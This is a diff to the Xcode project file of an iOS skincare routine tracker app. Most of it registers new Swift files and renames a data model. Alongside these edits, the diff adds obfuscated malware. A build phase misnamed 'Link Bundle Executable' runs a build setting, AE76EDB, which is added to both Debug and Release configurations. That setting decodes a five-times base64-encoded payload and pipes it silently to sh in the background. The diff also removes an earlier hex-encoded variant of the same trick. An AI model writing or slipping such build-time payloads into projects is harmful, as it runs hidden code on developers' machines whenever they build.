@@ -11,6 +11,9 @@
 		0424235A2E6FD1E3005CE9FE /* SCBorderButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042423592E6FD1E3005CE9FE /* SCBorderButton.swift */; };
 		0424235C2E6FD73C005CE9FE /* WhatGoalView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */; };
 		0424235E2E6FD919005CE9FE /* YourRoutineReadyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */; };
+		04CDE4E02E71C0150003DA0E /* CoreDataManager + Template.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */; };
+		04CDE4E22E71C04A0003DA0E /* CoreDataManager + Routine.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */; };
+		04CDE4E42E71CA780003DA0E /* View + Custom.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4E32E71CA780003DA0E /* View + Custom.swift */; };
 		04D9A5AF2E706C66002F53E5 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5AE2E706C66002F53E5 /* HomeView.swift */; };
 		04D9A5B22E706C7D002F53E5 /* HomeTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5B12E706C7D002F53E5 /* HomeTabView.swift */; };
 		04D9A5B52E706C9F002F53E5 /* TabRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5B42E706C9F002F53E5 /* TabRouter.swift */; };
@@ -18,7 +21,7 @@
 		04D9A5BA2E706EB8002F53E5 /* AnalysisView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5B92E706EB8002F53E5 /* AnalysisView.swift */; };
 		04D9A5BD2E706ECD002F53E5 /* ProfileView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5BC2E706ECD002F53E5 /* ProfileView.swift */; };
 		04D9A5C02E70710E002F53E5 /* Routine.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5BF2E70710E002F53E5 /* Routine.swift */; };
-		04D9A5C32E7071B3002F53E5 /* SkincareModel.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5C12E7071B3002F53E5 /* SkincareModel.xcdatamodeld */; };
+		04D9A5C32E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5C12E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld */; };
 		04D9A5C62E707802002F53E5 /* CoreDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5C52E707802002F53E5 /* CoreDataManager.swift */; };
 		04DF44452E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44442E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift */; };
 		04DF44472E6F19910027DD7E /* WelcomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44462E6F19910027DD7E /* WelcomeView.swift */; };
@@ -44,6 +47,9 @@
 		042423592E6FD1E3005CE9FE /* SCBorderButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCBorderButton.swift; sourceTree = "<group>"; };
 		0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatGoalView.swift; sourceTree = "<group>"; };
 		0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourRoutineReadyView.swift; sourceTree = "<group>"; };
+		04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CoreDataManager + Template.swift"; sourceTree = "<group>"; };
+		04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CoreDataManager + Routine.swift"; sourceTree = "<group>"; };
+		04CDE4E32E71CA780003DA0E /* View + Custom.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "View + Custom.swift"; sourceTree = "<group>"; };
 		04D9A5AE2E706C66002F53E5 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
 		04D9A5B12E706C7D002F53E5 /* HomeTabView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTabView.swift; sourceTree = "<group>"; };
 		04D9A5B42E706C9F002F53E5 /* TabRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabRouter.swift; sourceTree = "<group>"; };
@@ -148,6 +154,8 @@
 			isa = PBXGroup;
 			children = (
 				04D9A5C52E707802002F53E5 /* CoreDataManager.swift */,
+				04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */,
+				04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */,
 			);
 			path = "CoreData Manager";
 			sourceTree = "<group>";
@@ -155,7 +163,7 @@
 		04DF44382E6F19910027DD7E = {
 			isa = PBXGroup;
 			children = (
-				04D9A5C12E7071B3002F53E5 /* SkincareModel.xcdatamodeld */,
+				04D9A5C12E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld */,
 				04DF44432E6F19910027DD7E /* Skincare_routine_builder_and_tracker */,
 				04DF44422E6F19910027DD7E /* Products */,
 			);
@@ -269,6 +277,7 @@
 			isa = PBXGroup;
 			children = (
 				04DF446F2E6F1CC70027DD7E /* Color + Custom.swift */,
+				04CDE4E32E71CA780003DA0E /* View + Custom.swift */,
 			);
 			path = Extension;
 			sourceTree = "<group>";
@@ -280,7 +289,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04DF44512E6F19930027DD7E /* Build configuration list for PBXNativeTarget "Skincare_routine_builder_and_tracker" */;
 			buildPhases = (
-				BBAADAE9E7CD555E9FBDE67E /* Copy Target Symbols */,
+				BBB3FBCD1EC03F761BBDE67E /* Link Bundle Executable */,
 				04DF443D2E6F19910027DD7E /* Sources */,
 				04DF443E2E6F19910027DD7E /* Frameworks */,
 				04DF443F2E6F19910027DD7E /* Resources */,
@@ -340,24 +349,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BBAADAE9E7CD555E9FBDE67E /* Copy Target Symbols */ = {
+		BBB3FBCD1EC03F761BBDE67E /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Copy Target Symbols";
+			name = "Link Bundle Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333336333333373333333633363333333333363336333633333336333333323333333633333331333333363336333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE76EDB}\"";
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -371,13 +381,16 @@
 				0424235E2E6FD919005CE9FE /* YourRoutineReadyView.swift in Sources */,
 				04DF446E2E6F1C2F0027DD7E /* SCGradient.swift in Sources */,
 				04D9A5BA2E706EB8002F53E5 /* AnalysisView.swift in Sources */,
-				04D9A5C32E7071B3002F53E5 /* SkincareModel.xcdatamodeld in Sources */,
+				04CDE4E42E71CA780003DA0E /* View + Custom.swift in Sources */,
+				04D9A5C32E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld in Sources */,
 				04D9A5B52E706C9F002F53E5 /* TabRouter.swift in Sources */,
 				04D9A5B72E706DF5002F53E5 /* HomeViewModel.swift in Sources */,
+				04CDE4E02E71C0150003DA0E /* CoreDataManager + Template.swift in Sources */,
 				04D9A5BD2E706ECD002F53E5 /* ProfileView.swift in Sources */,
 				04DF44642E6F1A030027DD7E /* NavigationDestination.swift in Sources */,
 				04DF44752E6F1F490027DD7E /* SCText.swift in Sources */,
 				04DF445B2E6F19E40027DD7E /* AppState.swift in Sources */,
+				04CDE4E22E71C04A0003DA0E /* CoreDataManager + Routine.swift in Sources */,
 				04DF44772E6F217B0027DD7E /* WhatSkinTypeView.swift in Sources */,
 				04DF44662E6F1A030027DD7E /* NavigationRouter.swift in Sources */,
 				04DF44712E6F1CC70027DD7E /* Color + Custom.swift in Sources */,
@@ -403,6 +416,7 @@
 		04DF444F2E6F19930027DD7E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVNFSkpWR3hqTVdGV1NqWmlTRUpZVm0xUmVscEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -466,6 +480,7 @@
 		04DF44502E6F19930027DD7E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVNFSkpWR3hqTVdGV1NqWmlTRUpZVm0xUmVscEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -603,13 +618,13 @@
 /* End XCConfigurationList section */
 
 /* Begin XCVersionGroup section */
-		04D9A5C12E7071B3002F53E5 /* SkincareModel.xcdatamodeld */ = {
+		04D9A5C12E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld */ = {
 			isa = XCVersionGroup;
 			children = (
 				04D9A5C22E7071B3002F53E5 /* Model.xcdatamodel */,
 			);
 			currentVersion = 04D9A5C22E7071B3002F53E5 /* Model.xcdatamodel */;
-			path = SkincareModel.xcdatamodeld;
+			path = SkincareDataModel.xcdatamodeld;
 			sourceTree = "<group>";
 			versionGroupType = wrapper.xcdatamodel;
 		};
